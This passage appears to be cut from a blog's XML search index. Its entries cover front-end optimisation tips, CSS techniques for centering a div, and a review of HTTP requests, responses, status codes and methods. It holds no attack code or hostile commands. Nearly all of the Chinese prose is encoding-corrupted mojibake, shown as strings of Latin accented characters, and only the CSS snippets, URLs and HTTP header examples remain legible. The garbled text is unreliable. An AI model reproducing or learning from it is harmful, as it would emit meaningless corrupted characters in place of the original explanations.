å‰ç«¯å¼€å‘çš„ä¼˜åŒ–é—®é¢˜ï¼ˆ1ï¼‰ å‡å°‘httpè¯·æ±‚æ¬¡æ•°ï¼šcss spirit,data uri ï¼ˆ2ï¼‰ JSï¼ŒCSSæºç åŽ‹ç¼© ï¼ˆ3ï¼‰ å‰ç«¯æ¨¡æ¿ JS+æ•°æ®ï¼Œå‡å°‘ç”±äºŽHTMLæ ‡ç­¾å¯¼è‡´çš„å¸¦å®½æµªè´¹ï¼Œå‰ç«¯ç”¨å˜é‡ä¿å­˜AJAXè¯·æ±‚ç»“æžœï¼Œæ¯æ¬¡æ“ä½œæœ¬åœ°å˜é‡ï¼Œä¸ç”¨è¯·æ±‚ï¼Œå‡å°‘è¯·æ±‚æ¬¡æ•° ï¼ˆ4ï¼‰ ç”¨innerHTMLä»£æ›¿DOMæ“ä½œï¼Œå‡å°‘DOMæ“ä½œæ¬¡æ•°ï¼Œä¼˜åŒ–javascriptæ€§èƒ½ ï¼ˆ5ï¼‰ ç”¨setTimeoutæ¥é¿å…é¡µé¢å¤±åŽ»å“åº” ï¼ˆ6ï¼‰ ç”¨hash-tableæ¥ä¼˜åŒ–æŸ¥æ‰¾ ï¼ˆ7ï¼‰ å½“éœ€è¦è®¾ç½®çš„æ ·å¼å¾ˆå¤šæ—¶è®¾ç½®classNameè€Œä¸æ˜¯ç›´æŽ¥æ“ä½œstyle ï¼ˆ8ï¼‰ å°‘ç”¨å…¨å±€å˜é‡ ï¼ˆ9ï¼‰ ç¼“å­˜DOMèŠ‚ç‚¹æŸ¥æ‰¾çš„ç»“æžœ ï¼ˆ10ï¼‰ é¿å…ä½¿ç”¨CSS Expression ï¼ˆ11ï¼‰ å›¾ç‰‡é¢„è½½ ï¼ˆ12ï¼‰ é¿å…åœ¨é¡µé¢çš„ä¸»ä½“å¸ƒå±€ä¸­ä½¿ç”¨tableï¼Œtableè¦ç­‰å…¶ä¸­çš„å†…å®¹å®Œå…¨ä¸‹è½½ä¹‹åŽæ‰ä¼šæ˜¾ç¤ºå‡ºæ¥ï¼Œæ˜¾ç¤ºæ¯”div+csså¸ƒå±€æ…¢]]></content>
      <categories>
        <category>è¯•é¢˜</category>
      </categories>
      <tags>
        <tag>test</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[æ°´å¹³åž‚ç›´å±…ä¸­å¯¹é½çš„å‡ ç§æ–¹æ¡ˆ]]></title>
    <url>%2F2018-05-11-horizontalVerticalCenter.html</url>
    <content type="text"><![CDATA[æ°´å¹³åž‚ç›´å±…ä¸­123456789101112&lt;div class="box1"&gt;&lt;/div&gt;&lt;div class="box2"&gt;&lt;/div&gt;&lt;div class="box3"&gt;&lt;/div&gt;&lt;div class="box4"&gt; &lt;div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class="box5"&gt; &lt;div class="content"&gt; &lt;div class="inner"&gt; &lt;/div&gt; &lt;/div&gt;&lt;/div&gt; å®žçŽ°divæ°´å¹³åž‚ç›´å±…ä¸­çš„å‡ ä¸ªæ–¹æ¡ˆä¸€ã€margin:autoå®žçŽ°ç»å¯¹å®šä½å…ƒç´ çš„å±…ä¸­ï¼Œå…¼å®¹æ€§ï¼šie7ä¹‹å‰çš„ç‰ˆæœ¬ä¸é€‚ç”¨ 1234567891011.box1&#123; width: 200px; height: 200px; background: green; position: absolute; left:0; right: 0; bottom:0; top: 0; margin: auto;&#125; äºŒã€marginè´Ÿé—´è· 12345678910.box2&#123; width:200px; height: 200px; background:red; position: absolute; left:50%; top:50%; margin-left: -100px; margin-top: -100px;&#125; ä¸‰ã€transforms å˜å½¢ å…¼å®¹æ€§ï¼šie8ä¸æ”¯æŒ 123456789.box3&#123; width:200px; height: 200px; background:blue; position: absolute; left:50%; /*å®šä½çˆ¶çº§çš„50%*/ top:50%; transform:translate(-50%,-50%);/*è‡ªå·±çš„50%*/&#125; å››ã€cssä¸å®šå®½æ°´å¹³åž‚ç›´å±…ä¸­ï¼ˆé«˜è¦è®¾ç½®ï¼‰ 12345678910.box4&#123; display: flex; justify-content: center; align-items: center;&#125;.box4&gt;div&#123; background:#ff9; width: 200px; height: 200px;&#125; äº”ã€table-cellå¸ƒå±€table-cellç›¸å½“ä¸Žè¡¨æ ¼çš„tdï¼Œtdä¸ºè¡Œå†…å…ƒç´ ï¼Œæ— æ³•è®¾ç½®å®½å’Œé«˜ï¼Œæ‰€ä»¥åµŒå¥—ä¸€å±‚ï¼ŒåµŒå¥—ä¸€å±‚å¿…é¡»è®¾ç½®display: inline-block;tdçš„èƒŒæ™¯è¦†ç›–äº†æ©˜é»„è‰²ï¼Œä¸æŽ¨èä½¿ç”¨ 123456789101112131415161718.box5&#123; background-color: #FF8C00;/*æ©˜é»„è‰²*/ width: 300px; height: 300px; display: table;&#125;.content&#123; background-color: #F00;/*çº¢è‰²*/ display: table-cell; vertical-align: middle;/*ä½¿å­å…ƒç´ åž‚ç›´å±…ä¸­*/ text-align: center;/*ä½¿å­å…ƒç´ æ°´å¹³å±…ä¸­*/&#125;.inner&#123; background-color: #000;/*é»‘è‰²*/ display: inline-block; width: 20%; height: 20%;&#125;]]></content>
      <categories>
        <category>ç•Œé¢å¸ƒå±€</category>
      </categories>
      <tags>
        <tag>css</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[httpåè®®]]></title>
    <url>%2F2018-05-11-httpReview.html</url>
    <content type="text"><![CDATA[httpåè®®HTTPåè®®å¤ä¹  ç®€ä»‹httpåè®®æ˜¯Hyper Text Transfer Protocol(è¶…æ–‡æœ¬ä¼ è¾“åè®®)çš„ç¼©å†™ï¼Œæ˜¯ç”¨äºŽä»Žä¸‡ç»´ç½‘ï¼ˆWWWï¼šWorld Wide Webï¼‰æœåŠ¡å™¨ä¼ è¾“è¶…æ–‡æœ¬åˆ°æœ¬åœ°æµè§ˆå™¨çš„ä¼ é€åè®®ã€‚httpæ˜¯ä¸€ä¸ªåŸºäºŽTcp/ipé€šä¿¡åè®®æ¥ä¼ é€’æ•°æ®ï¼ˆHTMLæ–‡ä»¶ï¼Œå›¾ç‰‡æ–‡ä»¶ï¼ŒæŸ¥è¯¢ç»“æžœç­‰ï¼‰httpæ˜¯ä¸€ä¸ªå±žäºŽåº”ç”¨å±‚çš„é¢å¯¹å¯¹è±¡çš„åè®®ï¼Œå·¥ä½œäºŽå®¢æˆ·ç«¯-æœåŠ¡ç«¯æž¶æž„ä¸Šï¼Œæµè§ˆå™¨ä½œä¸ºhttpå®¢æˆ·ç«¯é€šè¿‡urlæƒ³httpæœåŠ¡ç«¯å³WebæœåŠ¡å™¨å‘é€æ‰€æœ‰è¯·æ±‚ã€‚WebæœåŠ¡å™¨æ ¹æ®æŽ¥å—æ”¶åˆ°çš„è¯·æ±‚åŽï¼Œå‘å®¢æˆ·ç«¯å‘é€ç›¸åº”ä¿¡æ¯ ä¸»è¦ç‰¹ç‚¹1.ç®€å•å¿«é€Ÿï¼šå®¢æˆ·å‘æœåŠ¡å™¨è¯·æ±‚æœåŠ¡æ—¶ï¼Œåªéœ€ä¼ é€è¯·æ±‚æ–¹æ³•å’Œè·¯åŠ²ã€‚è¯·æ±‚æ–¹æ³•å¸¸ç”¨çš„æœ‰GETã€Headã€Postã€‚æ¯ç§æ–¹æ³•è§„å®šäº†å®¢æˆ·ä¸ŽæœåŠ¡å™¨è”ç³»çš„ç±»åž‹ä¸åŒï¼Œç”±äºŽhttpåè®®ç®€å•ï¼Œä½¿å¾—httpæœåŠ¡å™¨çš„ç¨‹åºè§„æ¨¡å°ï¼Œå› è€Œé€šä¿¡é€Ÿåº¦å¾ˆå¿«ã€‚2.çµæ´»ï¼šhttpè¿è¡Œä¼ è¾“ä»»æ„ç±»åž‹çš„æ•°æ®å¯¹è±¡ï¼Œæ­£åœ¨ä¼ è¾“çš„ç±»åž‹ç”±Content-TypeåŠ ä»¥æ ‡è®°3.æ— è¿žæŽ¥ï¼šæ— è¿žæŽ¥çš„å«ä¹‰æ˜¯é™åˆ¶æ¯æ¬¡è¿žæŽ¥åªå¤„ç†ä¸€ä¸ªè¯·æ±‚ï¼ŒæœåŠ¡å™¨å¤„ç†å®Œå®¢æˆ·çš„è¯·æ±‚ï¼Œå¹¶æ”¶åˆ°å®¢æˆ·çš„åº”ç­”åŽï¼Œå³æ–­å¼€è¿žæŽ¥ï¼Œé‡‡ç”¨è¿™ç§æ–¹å¼å¯ä»¥èŠ‚çœä¼ è¾“æ—¶é—´ã€‚4.æ— çŠ¶æ€ï¼šhttpæ˜¯æ— çŠ¶æ€åè®®ã€‚æ— çŠ¶æ€æ˜¯æŒ‡åè®®å¯¹äºŽäº‹åŠ¡å¤„ç†æ²¡æœ‰è®°å¿†èƒ½åŠ›ï¼Œç¼ºå°‘çŠ¶æ€æ„å‘³ç€å¦‚æžœåŽç»­å¤„ç†éœ€è¦å‰é¢çš„ä¿¡æ¯ï¼Œåˆ™å®ƒå¿…é¡»é‡ä¼ ï¼Œè¿™æ ·å¯èƒ½å¯¼è‡´æ¯æ¬¡è¿žæŽ¥ä¼ é€çš„æ•°æ®é‡å¢žå¤§ï¼Œå¦ä¸€æ–¹é¢ï¼Œåœ¨æœåŠ¡å™¨ä¸éœ€è¦å…ˆå‰ä¿¡æ¯æ—¶å®ƒçš„åº”ç­”å°±æ¯”è¾ƒå¿«5.æ”¯æŒB\Sä»¥åŠC\S HTTPä¹‹URLhttpä½¿ç”¨ç»Ÿä¸€èµ„æºæ ‡è¯†ç¬¦ï¼ˆuniform resource Identifierï¼ŒURIï¼‰æ¥ä¼ è¾“æ•°æ®å’Œå»ºç«‹è¿žæŽ¥ã€‚URLæ˜¯ä¸€ç§ç‰¹æ®Šç±»åž‹çš„URIï¼ŒåŒ…å«äº†ç”¨äºŽæŸ¥æ‰¾æŸä¸ªèµ„æºçš„è¶³å¤Ÿçš„ä¿¡æ¯ã€‚URLå…¨ç§°æ˜¯UniformResourceLocatorï¼Œä¸­æ–‡åå«åšç»Ÿä¸€èµ„æºå®šä¹‰ç¬¦ï¼Œæ˜¯äº’è”ç½‘ä¸Šç”¨æ¥æ ‡è¯†æŸä¸€å¤„èµ„æºçš„åœ°å€ï¼Œä»¥ä¸‹é¢è¿™ä¸ªURLä¸ºä¾‹ï¼Œä»‹ç»URLçš„å„éƒ¨åˆ†ç»„æˆhttp://www.baidu.com:8080/news/index.asp?id=5&amp;count=100#nameä¸€ä¸ªå®Œæ•´çš„URLåŒ…æ‹¬ä»¥ä¸‹å‡ ä¸ªéƒ¨åˆ†1.åè®®éƒ¨åˆ†ï¼šè¯¥urlåè®®éƒ¨åˆ†ä¸ºâ€œhttp:â€,è¿™ä»£è¡¨äº†ç½‘é¡µä½¿ç”¨çš„httpåè®®ï¼Œåœ¨Internetä¸­å¯ä»¥ä½¿ç”¨å¤šç§åè®®ï¼Œå¦‚httpã€ftpç­‰ã€‚ä¸Šä¾‹ä½¿ç”¨çš„æ˜¯httpåè®®ï¼Œåœ¨httpåŽé¢çš„â€œ//â€œâ€ä¸ºåˆ†éš”ç¬¦2.åŸŸåéƒ¨åˆ†:è¯¥urlçš„åŸŸåéƒ¨åˆ†ä¸ºâ€œwww.baidu.comâ€ï¼Œä¸€ä¸ªurlä¹Ÿå¯ä»¥ä½¿ç”¨ipåœ°å€ä½œä¸ºåŸŸåä½¿ç”¨3.ç«¯å£éƒ¨åˆ†ï¼šè·Ÿåœ¨åŸŸååŽé¢çš„æ˜¯ç«¯å£ï¼ŒåŸŸåä¸Žç«¯å£ä¹‹é—´ä½¿ç”¨â€œ:â€ä½œä¸ºåˆ†å‰²ç¬¦ï¼Œç«¯å£ä¸æ˜¯ä¸€ä¸ªurlå¿…é¡»çš„éƒ¨åˆ†ï¼Œå¦‚æžœå¿½ç•¥ç«¯å£éƒ¨åˆ†ï¼Œå°†é‡‡ç”¨é»˜è®¤ç«¯å£4.è™šæ‹Ÿç›®å½•éƒ¨åˆ†ï¼šä»ŽåŸŸååŽçš„ç¬¬ä¸€ä¸ªâ€œ/â€å¼€å§‹åˆ°æœ€åŽä¸€ä¸ªâ€œ/â€ä¸ºæ­¢ï¼Œæ˜¯è™šæ‹Ÿç›®å½•éƒ¨åˆ†ï¼Œè™šæ‹Ÿç›®å½•ä¹Ÿä¸æ˜¯ä¸€ä¸ªurlå¿…é¡»çš„éƒ¨åˆ†ï¼Œä¸Šä¾‹ä¸­è™šæ‹Ÿéƒ¨åˆ†æ˜¯â€œ/news/â€5.æ–‡ä»¶åéƒ¨åˆ†ï¼šä»ŽåŸŸåçš„æœ€åŽä¸€ä¸ªâ€œ/â€å¼€å§‹åˆ°â€œ?â€ä¸ºæ­¢ï¼Œå°±æ˜¯æ–‡ä»¶åéƒ¨åˆ†ï¼Œå¦‚æžœæ²¡æœ‰â€œ?â€ï¼Œåˆ™æ˜¯ä»ŽåŸŸååŽçš„æœ€åŽä¸€ä¸ªâ€œ/â€å¼€å§‹åˆ°â€œ#â€ä¸ºæ­¢ï¼Œæ˜¯æ–‡ä»¶éƒ¨åˆ†ï¼Œå¦‚æžœæ²¡æœ‰â€œ?â€å’Œâ€œ#â€ï¼Œé‚£ä¹ˆå°±ä»ŽåŸŸååŽçš„æœ€åŽä¸€ä¸ªâ€œ/â€å¼€å§‹åˆ°ç»“æŸï¼Œéƒ½æ˜¯æ–‡ä»¶åçš„éƒ¨åˆ†ã€‚ä¸Šä¾‹ä¸­çš„æ–‡ä»¶åæ˜¯â€œindex.aspâ€ã€‚æ–‡ä»¶åéƒ¨åˆ†ä¹Ÿä¸æ˜¯ä¸€ä¸ªurlå¿…é¡»çš„éƒ¨åˆ†ï¼Œå¦‚æžœå¿½ç•¥è¯¥éƒ¨åˆ†ï¼Œåˆ™ä½¿ç”¨é»˜è®¤çš„æ–‡ä»¶åã€‚7.å‚æ•°éƒ¨åˆ†ï¼šä»Žâ€œ?â€å¼€å§‹åˆ°â€œ#â€ä¸ºæ­¢ä¹‹é—´çš„éƒ¨åˆ†éƒ½æ˜¯å‚æ•°ï¼Œåˆç§°ä¸ºæœç´¢éƒ¨åˆ†ï¼ŒæŸ¥è¯¢éƒ¨åˆ†ã€‚ä¸Šä¾‹ä¸­å‚æ•°éƒ¨åˆ†ä¸ºâ€œid=5&amp;count=100â€ï¼Œå¤šä¸ªå‚æ•°é—´ç”¨â€œ&amp;â€éš”å¼€ httpè¯·æ±‚ä¹‹æ¶ˆæ¯requsetå®¢æˆ·ç«¯å‘é€ä¸€ä¸ªhttpè¯·æ±‚åˆ°æœåŠ¡å™¨çš„è¯·æ±‚æ¶ˆæ¯åŒ…æ‹¬ä»¥ä¸‹æ ¼å¼ï¼šè¯·æ±‚è¡Œï¼ˆrequest lineï¼‰\è¯·æ±‚å¤´éƒ¨ï¼ˆheaderï¼‰\ç©ºè¡Œã€è¯·æ±‚æ•°æ®å››ä¸ªéƒ¨åˆ†ç»„æˆ Getè¯·æ±‚ä¾‹å­ï¼Œä½¿ç”¨CharlesæŠ“å–çš„requestï¼šGET /562f25980001b1b106000338.jpg HTTP/1.1Host img.mukewang.comUser-Agent Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.106 Safari/537.36Accept image/webp,image/,/*;q=0.8Referer http://www.imooc.com/Accept-Encoding gzip, deflate, sdchAccept-Language zh-CN,zh;q=0.8 1.è¯·æ±‚è¡Œï¼Œç”¨æ¥è¯´æ˜Žè¯·æ±‚ç±»åž‹ï¼Œè¦è®¿é—®çš„èµ„æºä»¥åŠä½¿ç”¨çš„httpç‰ˆæœ¬è¯·æ±‚è¡Œä»¥ä¸€ä¸ªæ–¹æ³•ç¬¦å·å¼€å¤´ï¼Œä»¥ç©ºæ ¼åˆ†å¼€ï¼ŒåŽé¢è·Ÿç€è¯·æ±‚çš„URIå’Œåè®®çš„ç‰ˆæœ¬ã€‚ä¾‹å­ä¸­GETè¯´æ˜Žè¯·æ±‚ç±»åž‹ä¸ºGET,[/562f25980001b1b106000338.jpg]ä¸ºè¦è®¿é—®çš„èµ„æºï¼Œè¯¥è¡Œçš„æœ€åŽä¸€éƒ¨åˆ†è¯´æ˜Žä½¿ç”¨çš„æ˜¯HTTP1.1ç‰ˆæœ¬ã€‚2.è¯·æ±‚å¤´éƒ¨ï¼Œç´§æŽ¥ç€è¯·æ±‚è¡Œä¹‹åŽçš„éƒ¨åˆ†ï¼Œç”¨æ¥è¯´æ˜ŽæœåŠ¡å™¨è¦ä½¿ç”¨çš„é™„åŠ ä¿¡æ¯ä»Žç¬¬äºŒè¡Œèµ·ä¸ºè¯·æ±‚å¤´éƒ¨ï¼ŒHOSTå°†æŒ‡å‡ºè¯·æ±‚çš„ç›®çš„åœ°.User-Agent,æœåŠ¡å™¨ç«¯å’Œå®¢æˆ·ç«¯è„šæœ¬éƒ½èƒ½è®¿é—®å®ƒ,å®ƒæ˜¯æµè§ˆå™¨ç±»åž‹æ£€æµ‹é€»è¾‘çš„é‡è¦åŸºç¡€.è¯¥ä¿¡æ¯ç”±ä½ çš„æµè§ˆå™¨æ¥å®šä¹‰,å¹¶ä¸”åœ¨æ¯ä¸ªè¯·æ±‚ä¸­è‡ªåŠ¨å‘é€ç­‰ç­‰3.ç©ºè¡Œï¼Œè¯·æ±‚å¤´éƒ¨åŽé¢ç©ºè¡Œæ˜¯å¿…é¡»çš„å³ä½¿ç¬¬å››éƒ¨åˆ†çš„è¯·æ±‚æ•°æ®ä¸ºç©ºï¼Œä¹Ÿå¿…é¡»æœ‰ç©ºè¡Œã€‚4.è¯·æ±‚æ•°æ®ä¹Ÿå«ä¸»ä½“ï¼Œå¯ä»¥æ·»åŠ ä»»æ„çš„å…¶ä»–æ•°æ®getä¾‹å­çš„è¯·æ±‚æ•°æ®ä¸ºç©º POSTè¯·æ±‚ä¾‹å­ï¼Œä½¿ç”¨CharlesæŠ“å–çš„requestï¼šPOST / HTTP1.1Host:www.wrox.comUser-Agent:Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727; .NET CLR 3.0.04506.648; .NET CLR 3.5.21022)Content-Type:application/x-www-form-urlencodedContent-Length:40Connection: Keep-Alive name=Professional%20Ajax&amp;publisher=Wiley 1.è¯·æ±‚è¡Œï¼Œç¬¬ä¸€è¡Œæ˜Žäº†æ˜¯postè¯·æ±‚ï¼Œä»¥åŠhttp1.1ç‰ˆæœ¬ã€‚2.è¯·æ±‚å¤´éƒ¨ï¼Œç¬¬äºŒè¡Œè‡³ç¬¬å…­è¡Œã€‚3.ç©ºè¡Œï¼Œç¬¬ä¸ƒè¡Œçš„ç©ºè¡Œã€‚4.è¯·æ±‚æ•°æ®ï¼Œç¬¬å…«è¡Œã€‚ httpä¹‹å“åº”æ¶ˆæ¯responsehttpå“åº”ä¹Ÿç”±å››ä¸ªéƒ¨åˆ†ç»„æˆï¼Œåˆ†åˆ«æ˜¯çŠ¶æ€è¡Œã€æ¶ˆæ¯æŠ¥å¤´ç©ºè¡Œå’Œå“åº”æ­£æ–‡ã€‚ ä¾‹å­ HTTP/1.1 200 OKDate: Fri, 22 May 2009 06:07:21 GMTContent-Type: text/html; charset=UTF-8 &lt;html&gt; &lt;head&gt;&lt;/head&gt; &lt;body&gt; &lt;!--body goes here--&gt; &lt;/body&gt; &lt;/html&gt; 1.çŠ¶æ€è¡Œï¼Œç”±httpåè®®ç‰ˆæœ¬å·ï¼ŒçŠ¶æ€ç ï¼ŒçŠ¶æ€æ¶ˆæ¯ä¸‰éƒ¨åˆ†ç»„æˆã€‚ç¬¬ä¸€è¡Œä¸ºçŠ¶æ€è¡Œï¼Œï¼ˆHTTP/1.1ï¼‰è¡¨æ˜ŽHTTPç‰ˆæœ¬ä¸º1.1ç‰ˆæœ¬ï¼ŒçŠ¶æ€ç ä¸º200ï¼ŒçŠ¶æ€æ¶ˆæ¯ä¸ºï¼ˆokï¼‰2.æ¶ˆæ¯æŠ¥å¤´ï¼Œç”¨æ¥è¯´æ˜Žå®¢æˆ·ç«¯è¦ä½¿ç”¨çš„ä¸€äº›é™„åŠ ä¿¡æ¯ç¬¬äºŒè¡Œå’Œç¬¬ä¸‰è¡Œä¸ºæ¶ˆæ¯æŠ¥å¤´ï¼ŒDate:ç”Ÿæˆå“åº”çš„æ—¥æœŸå’Œæ—¶é—´ï¼›Content-Type:æŒ‡å®šäº†MIMEç±»åž‹çš„HTML(text/html),ç¼–ç ç±»åž‹æ˜¯UTF-83.ç©ºè¡Œï¼Œæ¶ˆæ¯æŠ¥å¤´åŽé¢çš„ç©ºè¡Œæ˜¯å¿…é¡»çš„4.å“åº”æ­£æ–‡ï¼ŒæœåŠ¡å™¨è¿”å›žç»™å®¢æˆ·ç«¯çš„æ–‡æœ¬ä¿¡æ¯ã€‚ç©ºè¡ŒåŽé¢çš„htmléƒ¨åˆ†ä¸ºå“åº”æ­£æ–‡ã€‚ Requestï¼šè¯·æ±‚è¡Œ+è¯·æ±‚å¤´éƒ¨+ç©ºè¡Œ+è¯·æ±‚æ•°æ®Responseï¼šçŠ¶æ€è¡Œ+æ¶ˆæ¯æŠ¥å¤´+ç©ºè¡Œ+å“åº”æ­£æ–‡ httpä¹‹çŠ¶æ€ç 1xxï¼šæŒ‡ç¤ºä¿¡æ¯â€“è¡¨ç¤ºè¯·æ±‚å·²æŽ¥æ”¶ï¼Œç»§ç»­å¤„ç†2xxï¼šæˆåŠŸâ€“è¡¨ç¤ºè¯·æ±‚å·²è¢«æˆåŠŸæŽ¥æ”¶ã€ç†è§£ã€æŽ¥å—3xxï¼šé‡å®šå‘â€“è¦å®Œæˆè¯·æ±‚å¿…é¡»è¿›è¡Œæ›´è¿›ä¸€æ­¥çš„æ“ä½œ4xxï¼šå®¢æˆ·ç«¯é”™è¯¯â€“è¯·æ±‚æœ‰è¯­æ³•é”™è¯¯æˆ–è¯·æ±‚æ— æ³•å®žçŽ°5xxï¼šæœåŠ¡å™¨ç«¯é”™è¯¯â€“æœåŠ¡å™¨æœªèƒ½å®žçŽ°åˆæ³•çš„è¯·æ±‚ å¸¸è§çŠ¶æ€ç ï¼š 200 OK //å®¢æˆ·ç«¯è¯·æ±‚æˆåŠŸ400 Bad Request //å®¢æˆ·ç«¯è¯·æ±‚æœ‰è¯­æ³•é”™è¯¯ï¼Œä¸èƒ½è¢«æœåŠ¡å™¨æ‰€ç†è§£401 Unauthorized //è¯·æ±‚æœªç»æŽˆæƒï¼Œè¿™ä¸ªçŠ¶æ€ä»£ç å¿…é¡»å’ŒWWW-AuthenticateæŠ¥å¤´åŸŸä¸€èµ·ä½¿ç”¨403 Forbidden //æœåŠ¡å™¨æ”¶åˆ°è¯·æ±‚ï¼Œä½†æ˜¯æ‹’ç»æä¾›æœåŠ¡404 Not Found //è¯·æ±‚èµ„æºä¸å­˜åœ¨ï¼Œegï¼šè¾“å…¥äº†é”™è¯¯çš„URL500 Internal Server Error //æœåŠ¡å™¨å‘ç”Ÿä¸å¯é¢„æœŸçš„é”™è¯¯503 Server Unavailable //æœåŠ¡å™¨å½“å‰ä¸èƒ½å¤„ç†å®¢æˆ·ç«¯çš„è¯·æ±‚ï¼Œä¸€æ®µæ—¶é—´åŽå¯èƒ½æ¢å¤æ­£å¸¸ httpè¯·æ±‚æ–¹æ³•æ ¹æ®HTTPæ ‡å‡†ï¼ŒHTTPè¯·æ±‚å¯ä»¥ä½¿ç”¨å¤šç§è¯·æ±‚æ–¹æ³•ã€‚HTTP1.0å®šä¹‰äº†ä¸‰ç§è¯·æ±‚æ–¹æ³•ï¼š GET, POST å’Œ HEADæ–¹æ³•ã€‚HTTP1.1æ–°å¢žäº†äº”ç§è¯·æ±‚æ–¹æ³•ï¼šOPTIONS, PUT, DELETE, TRACE å’Œ CONNECT æ–¹æ³•ã€‚ GET è¯·æ±‚æŒ‡å®šçš„é¡µé¢ä¿¡æ¯ï¼Œå¹¶è¿”å›žå®žä½“ä¸»ä½“ã€‚HEAD ç±»ä¼¼äºŽgetè¯·æ±‚ï¼Œåªä¸è¿‡è¿”å›žçš„å“åº”ä¸­æ²¡æœ‰å…·ä½“çš„å†…å®¹ï¼Œç”¨äºŽèŽ·å–æŠ¥å¤´POST å‘æŒ‡å®šèµ„æºæäº¤æ•°æ®è¿›è¡Œå¤„ç†è¯·æ±‚ï¼ˆä¾‹å¦‚æäº¤è¡¨å•æˆ–è€…ä¸Šä¼ æ–‡ä»¶ï¼‰ã€‚æ•°æ®è¢«åŒ…å«åœ¨è¯·æ±‚ä½“ä¸­ã€‚POSTè¯·æ±‚å¯èƒ½ä¼šå¯¼è‡´æ–°çš„èµ„æºçš„å»ºç«‹å’Œ/æˆ–å·²æœ‰èµ„æºçš„ä¿®æ”¹ã€‚PUT ä»Žå®¢æˆ·ç«¯å‘æœåŠ¡å™¨ä¼ é€çš„æ•°æ®å–ä»£æŒ‡å®šçš„æ–‡æ¡£çš„å†…å®¹ã€‚DELETE è¯·æ±‚æœåŠ¡å™¨åˆ é™¤æŒ‡å®šçš„é¡µé¢ã€‚CONNECT HTTP/1.1åè®®ä¸­é¢„ç•™ç»™èƒ½å¤Ÿå°†è¿žæŽ¥æ”¹ä¸ºç®¡é“æ–¹å¼çš„ä»£ç†æœåŠ¡å™¨ã€‚OPTIONS å…è®¸å®¢æˆ·ç«¯æŸ¥çœ‹æœåŠ¡å™¨çš„æ€§èƒ½ã€‚TRACE å›žæ˜¾æœåŠ¡å™¨æ”¶åˆ°çš„è¯·æ±‚ï¼Œä¸»è¦ç”¨äºŽæµ‹è¯•æˆ–è¯Šæ–­ã€‚ httpå·¥ä½œåŽŸç†HTTPåè®®å®šä¹‰Webå®¢æˆ·ç«¯å¦‚ä½•ä»ŽWebæœåŠ¡å™¨è¯·æ±‚Webé¡µé¢ï¼Œä»¥åŠæœåŠ¡å™¨å¦‚ä½•æŠŠWebé¡µé¢ä¼ é€ç»™å®¢æˆ·ç«¯ã€‚HTTPåè®®é‡‡ç”¨äº†è¯·æ±‚/å“åº”æ¨¡åž‹ã€‚å®¢æˆ·ç«¯å‘æœåŠ¡å™¨å‘é€ä¸€ä¸ªè¯·æ±‚æŠ¥æ–‡ï¼Œè¯·æ±‚æŠ¥æ–‡åŒ…å«è¯·æ±‚çš„æ–¹æ³•ã€URLã€åè®®ç‰ˆæœ¬ã€è¯·æ±‚å¤´éƒ¨å’Œè¯·æ±‚æ•°æ®ã€‚æœåŠ¡å™¨ä»¥ä¸€ä¸ªçŠ¶æ€è¡Œä½œä¸ºå“åº”ï¼Œå“åº”çš„å†…å®¹åŒ…æ‹¬åè®®çš„ç‰ˆæœ¬ã€æˆåŠŸæˆ–è€…é”™è¯¯ä»£ç ã€æœåŠ¡å™¨ä¿¡æ¯ã€å“åº”å¤´éƒ¨å’Œå“åº”æ•°æ®ã€‚ ä»¥ä¸‹æ˜¯ HTTP è¯·æ±‚/å“åº”çš„æ­¥éª¤ï¼š1.å®¢æˆ·ç«¯è¿žæŽ¥åˆ°webæœåŠ¡å™¨ä¸€ä¸ªhttpå®¢æˆ·ç«¯ï¼Œé€šå¸¸æ˜¯æµè§ˆå™¨ï¼Œä¸ŽwebæœåŠ¡å™¨çš„httpç«¯å£ï¼ˆé»˜è®¤ä¸º80ï¼‰å»ºç«‹ä¸€ä¸ªtcpå¥—æŽ¥å­—è¿žæŽ¥2.å‘é€httpè¯·æ±‚é€šè¿‡tcpå¥—æŽ¥å­—ï¼Œå®¢æˆ·ç«¯å‘WebæœåŠ¡ç«¯å‘é€ä¸€ä¸ªæ–‡æœ¬çš„è¯·æ±‚æŠ¥æ–‡ï¼Œä¸€ä¸ªè¯·æ±‚æŠ¥æ–‡ç”±è¯·æ±‚è¡Œã€è¯·æ±‚å¤´éƒ¨ã€ç©ºè¡Œå’Œè¯·æ±‚æ•°æ®4éƒ¨åˆ†ç»„æˆ3.æœåŠ¡å™¨æŽ¥å—è¯·æ±‚å¹¶è¿”å›žhttpå“åº”.WebæœåŠ¡å™¨è§£æžè¯·æ±‚ï¼Œå®šä½è¯·æ±‚èµ„æºã€‚æœåŠ¡å™¨å°†èµ„æºå¤æœ¬å†™åˆ°TCPå¥—æŽ¥å­—ï¼Œç”±å®¢æˆ·ç«¯è¯»å–ï¼Œä¸€ä¸ªå“åº”ç”±çŠ¶æ€è¡Œï¼Œå“åº”å¤´éƒ¨ï¼Œç©ºè¡Œï¼Œå“åº”æ­£æ–‡ç»„æˆã€‚4.é‡Šæ”¾tcpè¿žæŽ¥ï¼Œè‹¥connectionæ¨¡å¼ä¸ºcloseï¼Œåˆ™æœåŠ¡å™¨ä¸»åŠ¨å…³é—­tcpè¿žæŽ¥ï¼Œå®¢æˆ·ç«¯è¢«åŠ¨å…³é—­è¿žæŽ¥ï¼Œé‡Šæ”¾tcpè¿žæŽ¥ï¼Œè‹¥connectionæ¨¡å¼ä¸ºkeepaliveï¼Œåˆ™è¯¥è¿žæŽ¥ä¼šä¿æŒä¸€æ®µæ—¶é—´ï¼Œåœ¨è¯¥æ—¶é—´å†…å¯ä»¥ç»§ç»­æŽ¥å—è¯·æ±‚ã€‚5.å®¢æˆ·ç«¯æµè§ˆå™¨è§£æžhtmlå†…å®¹ã€‚å®¢æˆ·ç«¯æµè§ˆå™¨é¦–å…ˆè§£æžçŠ¶æ€è¡Œï¼ŒæŸ¥çœ‹è¡¨æ˜Žè¯·æ±‚æ˜¯å¦æˆåŠŸçš„çŠ¶æ€ä»£ç 